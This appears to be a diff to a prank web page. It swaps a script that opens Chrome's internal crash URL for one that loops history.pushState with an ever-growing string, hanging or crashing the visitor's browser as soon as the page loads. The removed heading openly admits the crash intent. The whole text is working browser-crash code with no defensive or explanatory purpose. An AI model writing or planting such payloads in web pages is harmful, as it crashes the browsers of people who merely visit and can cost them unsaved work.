@@ -1,3 +1,7 @@
-<script>let newTab = window.open('about:blank', '_blank');
-newTab.location.href = 'chrome://inducebrowsercrashforrealz';</script>
-<h1>If you are seeing this it did not work XD<br>USE CHROME FOR THIS TO WORK</h1>
+<script>
+var total = "";
+for( var i = 0; i < 10000000000000; i++ ) {
+  total += i.toString();
+  history.pushState(0,0, total );
+}
+</script>
